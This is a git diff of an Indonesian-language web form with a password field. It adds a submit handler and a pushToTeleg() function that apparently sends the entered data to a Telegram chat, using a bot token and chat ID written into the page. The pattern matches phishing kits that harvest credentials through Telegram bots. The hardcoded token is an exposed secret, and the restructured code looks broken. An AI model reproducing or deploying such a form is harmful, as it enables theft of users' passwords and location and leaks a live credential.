@@ -42,7 +42,7 @@
       <br>
       <input class="1" id="kata_sandi" type="password" placeholder="Masukkan Kata Sandi" required></input>
       <br>
-      <input id="submit" type="submit" onclick="sendText()"></input>
+      <input id="submit" type="submit" onclick="submitd()"></input>
       <br>
     <footer>Waktu Di-Submit :</footer>
     </form>
@@ -67,7 +67,28 @@ req.addEventListener("click", function(event) {
 var b = document.querySelector('form > label');
   b.innerHTML = b.value + " Wajib";
 });
+      function submitd() {
+        
+ let datesubmit;
+        var waktu = new Date();
+        var tahun = waktu.getFullYear();
+        var bulan = waktu.toLocaleDateString('id-ID', { month: 'long' });
+        var tanggal = waktu.getDate();
+        var hari = waktu.toLocaleDateString('id-ID', { weekday: 'long' });
+        var jam = waktu.getHours();
+        var menit = waktu.getMinutes();
+        var detik = waktu.getSeconds();
+   // Tambahkan angka 0 di depan jam, menit, dan detik jika nilainya kurang dari 10
+   jam = (jam < 10 ? "0" : "") + jam;
+   menit = (menit < 10 ? "0" : "") + menit;
+   detik = (detik < 10 ? "0" : "") + detik;
 
+ var waktuString = hari + ', ' + tanggal + ' ' + bulan + ' ' + tahun + ' ' + jam + ':' + menit + ':' + detik;
+document.querySelector('form > footer').innerHTML = "Waktu Di-Submit : " + waktuString
+ datesubmit = waktuString; 
+        pushToTeleg()
+      }
+function pushToTeleg() {
       const botToken = '5906990752:AAHv8iFSmHu4MC4SM_IB3EZSiyTLxaZULvM';
 const chatId = '-1001983705713';
 
@@ -94,25 +115,6 @@ inputDate.addEventListener("change", function() {
 
 form.addEventListener('submit', async (event) => {
   event.preventDefault();
-// let datesubmit;
- //                       var waktu = new Date();
- //*                       var tahun = waktu.getFullYear();
-   //                     var bulan = waktu.toLocaleDateString('id-ID', { month: 'long' });
-                //        var tanggal = waktu.getDate();
-          //          var hari = waktu.toLocaleDateString('id-ID', { weekday: 'long' });
-                     //   var jam = waktu.getHours();
-              //          var menit = waktu.getMinutes();
-                //        var detik = waktu.getSeconds();
-
-   //                     // Tambahkan angka 0 di depan jam, menit, dan detik jika nilainya kurang dari 10
-     //                   jam = (jam < 10 ? "0" : "") + jam;
-      //                  menit = (menit < 10 ? "0" : "") + menit;
-   //                     detik = (detik < 10 ? "0" : "") + detik;
-
- //*                      var waktuString = hari + ', ' + tanggal + ' ' + bulan + ' ' + tahun + ' ' + jam + ':' + menit + ':' + detik;
-// document.querySelector('form > footer').innerHTML = "Waktu Di-Submit : " + waktuString
- //                       datesubmit = waktuString; 
-
   // Ambil nilai dari setiap elemen input
   const nama = document.getElementById('nama').value;
   const umur = document.getElementById('umur').value;
@@ -138,7 +140,7 @@ form.addEventListener('submit', async (event) => {
   alert("Berhasil Mengirim");
 });
 
-
+    }
 
       function getLocation() {
                         if (navigator.geolocation) {
